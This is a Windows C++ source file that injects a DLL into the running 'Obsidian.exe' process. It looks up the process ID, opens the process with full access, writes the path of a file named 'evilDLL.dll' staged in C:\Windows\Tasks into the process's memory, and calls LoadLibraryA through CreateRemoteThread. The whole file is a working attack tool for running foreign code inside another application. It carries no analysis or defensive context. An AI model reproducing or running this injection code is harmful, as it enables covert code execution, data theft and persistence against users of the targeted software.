#include <stdio.h>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int getPID(const char* pName) {

	HANDLE snapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL result;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (snapshot == INVALID_HANDLE_VALUE) return 0;

	pe.dwSize = sizeof(pe);
	result = Process32First(snapshot, &pe);

	while (result) {
		if (strcmp(pName, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		result = Process32Next(snapshot, &pe);
	}
	CloseHandle(snapshot);
	return pid;
}

int main(int argc, char* argv[])
{
	HANDLE hProc;
	LPVOID lpBase;
	char process[] = "Obsidian.exe";
	DWORD pid = getPID(process);
	const char* dll = "C:\\Windows\\Tasks\\evilDLL.dll";
	size_t sz = strlen(dll);
	
	// Get the process handle
	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	if (pid == 0) {
		std::cout << "[!] Process not found";
	}
	else {
		std::cout << "[*] Process: " << process << std::endl;
		std::cout << "[*] PID: " << pid << std::endl;
	}

	HMODULE hModule = GetModuleHandle("kernel32.dll");
	LPVOID lpStart = GetProcAddress(hModule, "LoadLibraryA");

	lpBase = VirtualAllocEx(hProc, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProc, lpBase, dll, sz, NULL);

	HANDLE rThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpStart, lpBase, 0, NULL);

	if (rThread == NULL) {
		std::cout << "[!] CreateRemoteThread Failed.";
	}
	else {
		std::cout << "[+] CreateRemoteThread Created.";
		CloseHandle(hProc);
	}
}
